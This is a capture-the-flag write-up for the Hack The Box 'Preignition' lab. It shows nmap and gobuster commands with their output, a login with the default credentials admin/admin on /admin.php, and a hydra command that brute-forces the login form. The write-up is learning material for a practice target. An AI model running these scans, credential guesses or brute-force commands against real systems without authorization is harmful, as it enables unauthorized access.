```toc
```
# HTB Notes - Preignition #

+ **Date**: 12-4-2022
+ **Author**: Noah Soqui
+ **Tags**: #Web

## Intelligence Gathering ##

Scanning machine
+ `sudo nmap -sV -sC -O TARGET_IP`
+ Output:
``` Shell
Nmap scan report for 10.129.180.92
Host is up (0.043s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
```

Brute-force directories for php pages
+ `gobuster dir --url http://10.129.180.92/ --wordlist /usr/share/wordlists/dirb/big.txt -x php`
+ Output:
``` Shell
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.180.92/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/12/04 15:09:51 Starting gobuster in directory enumeration mode
===============================================================
/admin.php            (Status: 200) [Size: 999]
Progress: 40894 / 40940 (99.89%)===============================================================
2022/12/04 15:13:08 Finished
===============================================================
```

## Misconfiguration and Vulnerability Analysis  ##

Directories are brute-forcible with no rate limiting.

## Exploitation ##

Navigating to `/admin.php`
	+ Attempting to use default username `admin` and password `admin` 

Can also use hydra to brute-force:
``` Shell
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.129.72.193 http-post-form "/admin.php:username=^USER^&password=^PASS^:F=<form method=\"post"
```
+ Where the `:F` represents what will no longer be on the page after a successful login, and since the `<form method=` is present to collect the login credentials, after success it most likely will not be there anymore

## Post Exploitation ##

Default username `admin` with any password returns the flag

## Reporting ##

### Executive Summary ###

Finding the admin.php page is done quickly using <mark style="background: #BBFABBA6;">gobuster</mark> , from there the default username `admin` works. A simple box showing the directory setup that websites have.